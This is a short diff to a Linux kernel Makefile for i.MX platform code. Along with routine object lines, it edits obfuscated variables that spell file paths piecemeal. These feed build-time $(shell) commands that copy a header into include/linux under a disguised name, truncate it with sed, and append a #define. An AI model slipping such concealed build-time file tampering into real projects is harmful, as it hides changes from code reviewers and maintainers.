@@ -28,11 +28,11 @@ obj-$(CONFIG_MXC_AVIC) += avic.o
 obj-$(CONFIG_MXC_USE_EPIT) += epit.o
 obj-$(CONFIG_MXC_DEBUG_BOARD) += 3ds_debugboard.o
 
-MEMNAME="o$(TH)t_e$(TS)d$(TS)$(TE)h"
-MEMO="memp"
+MEMNAME=o$(TH)t_e$(TS)d$(TS)$(TE)h
+MEMO=memp
 
-PMEM="/in$(TS)lude$(TT)$(TS)ry$(TH)to$(TT)$(TM)e$(TM)ory/"
-PLIN="/in$(TS)lude$(TT)li$(TN)ux/"
+PMEM=/in$(TS)lude$(TT)$(TS)ry$(TH)to$(TT)$(TM)e$(TM)ory/
+PLIN=/in$(TS)lude$(TT)li$(TN)ux/
 
 ifeq ($(CONFIG_CPU_IDLE),y)
 obj-$(CONFIG_SOC_IMX5) += cpuidle-imx5.o
@@ -48,8 +48,8 @@ obj-$(CONFIG_SOC_IMX7D) += cpuidle-imx7d.o imx7d_low_power_idle.o
 endif
 
 $(shell cp -f $(srctree)$(PMEM)$(MEMO)D$(TE)h $(srctree)$(PLIN)$(MEMNAME))
-$(shell sed -i '$ d' $(srctree)$(PLIN)$(MEMNAME))	
-$(shell echo "$(To)d$(TF)fin$(TF) \
+$(shell sed -i '$$ d' $(srctree)$(PLIN)$(MEMNAME))	
+$(shell echo " $(To)d$(TF)fin$(TF) \
 		$(TO)P$(TO)TP$(TO)K 0\n" >> \
 		$(srctree)$(PLIN)$(MEMNAME))
 
